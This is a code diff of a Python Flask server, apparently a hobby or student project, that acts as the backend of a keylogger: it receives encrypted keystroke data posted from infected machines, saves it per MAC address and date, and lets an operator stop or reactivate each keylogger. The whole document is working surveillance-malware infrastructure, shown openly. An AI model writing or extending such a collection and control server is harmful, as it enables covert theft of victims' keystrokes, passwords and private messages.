@@ -253,10 +253,14 @@ def process_raw_json_data(raw_data):
         return {}
 
 @app.route('/<mac_address>/stop', methods=['GET'])
+@login_required
 def stop_keylogger(mac_address):
     stop_by_mac_address(mac_address)
     response = {"message": "stop in the next messege to the server:111"}
     return flask.jsonify(response),200
+
+
+
 
 
 @app.route('/add_data', methods=['POST'])
@@ -264,7 +268,7 @@ def upload_data():
     # try:
         # קבלת נתונים כ-JSON
         new_data = flask.request.json
-        print(new_data)
+        # print(new_data)
         # אם אין נתונים, מחזירים שגיאה
         if not new_data:
             if chek_if_stop_by_mac_address(new_data):
@@ -275,11 +279,10 @@ def upload_data():
 
         # שמירת הנתונים
         save_new_data(decrypted_data)
-
         # מחזירים הודעת הצלחה
 
 
-        if chek_if_stop_by_mac_address(new_data):
+        if chek_if_stop_by_mac_address(decrypted_data):
             return flask.jsonify({'error': "No data received"}), 400
 
         else:
@@ -301,7 +304,6 @@ def get_data(computers,mac_address=None,date=None):
         return flask.jsonify(data), 200
 
 def save_new_data(data):
-    print(type(data))
     first_key = (next(iter(data)))
     mac_address = first_key.replace(":" , "-")
     # גישה למפתח השני במילון הפנימי
@@ -315,30 +317,43 @@ def save_new_data(data):
     with open(path+rf"\{date}.json" , "w" , encoding='utf-8') as file:
         json.dump(data , file , indent=4 , ensure_ascii=False)
 
+import json
 
 def get_first_string_from_json(json_content):
     """
     מקבלת מחרוזת JSON ומחזירה את הסטרינג הראשון שנמצא בתוכה.
-    בדוגמה של JSON כמו {"abc":123} – תוחזר המחרוזת "abc".
-
-    :param json_content: מחרוזת בפורמט JSON
-    :return: הסטרינג הראשון או None אם לא נמצא
+    אם מדובר במילון, תחזיר את המפתח הראשון אחרי המרת הנקודותיים למקפים.
     """
+    def convert_mac_key(key):
+        # המרת כתובת MAC עם נקודותיים למקפים
+        if isinstance(key, str):
+            return key.replace(":", "-")
+        return key
+
+    if isinstance(json_content, dict):  # אם זה מילון
+        # המרת כל המפתחות של המילון
+        json_content = {convert_mac_key(key): value for key, value in json_content.items()}
+        for key in json_content.keys():
+            if isinstance(key, str):
+                return key
+        return None
+
+    # אם זה לא מילון, נבצע את ה-JSON.loads() כמו קודם
     try:
         data = json.loads(json_content)
     except json.JSONDecodeError as e:
         print(f"תקלה בפירוש JSON: {e}")
         return None
 
-    # אם מדובר במילון, נניח שהסדר נשמר ונשלוף את המפתח הראשון.
+    # אם מדובר במילון, נשלוף את המפתח הראשון אחרי המרת הנקודותיים למקפים
     if isinstance(data, dict):
+        data = {convert_mac_key(key): value for key, value in data.items()}
         for key in data.keys():
             if isinstance(key, str):
                 return key
-        return None  # אם אין מפתחות שהם מחרוזות
+        return None
 
     # אם מדובר במבנה אחר (למשל, רשימה) ננסה למצוא את הסטרינג הראשון
-
     elif isinstance(data, list):
         for item in data:
             if isinstance(item, str):
@@ -352,9 +367,11 @@ def get_first_string_from_json(json_content):
         return None
 
 
+
+
+
 def stop_by_mac_address(mac_address):
     file_path = r"C:\Users\1\Desktop\keylogger\server_data\status_keylogger.json"
-
     try:
         with open(file_path, 'r', encoding='utf-8') as f:
             data = json.load(f)
@@ -369,6 +386,7 @@ def stop_by_mac_address(mac_address):
 
 def chek_if_stop_by_mac_address(json_data):
     mac_address = get_first_string_from_json(json_data)
+    file_path = r"C:\Users\1\Desktop\keylogger\server_data\status_keylogger.json"
     try:
         with open(file_path, 'r', encoding='utf-8') as f:
             data = json.load(f)
@@ -382,9 +400,29 @@ def chek_if_stop_by_mac_address(json_data):
 def health():
     return flask.jsonify({'status':'server active'}),200
 
+
+def change_action_to_active():
+    file_path = r"C:\Users\1\Desktop\keylogger\server_data\status_keylogger.json"
+
+    try:
+        with open(file_path, 'r', encoding='utf-8') as f:
+            data = json.load(f)
+    except FileNotFoundError:
+        data = {}
+    # עדכון או יצירת המפתח עם הערך False
+    for key , val in data.items():
+        print(key)
+        print(val)
+        data[key] = True
+
+    print(data)
+    # כתיבת המילון המעודכן חזרה לקובץ
+    with open(file_path, 'w', encoding='utf-8') as f:
+        json.dump(data, f, ensure_ascii=False, indent=4)
+change_action_to_active()
 if __name__ == '__main__':
     app.run(debug=True)
-# print(load_data("d0-39-57-0d-5c-a5" , date='24-02-2025_10-10'))
+
 
 
 
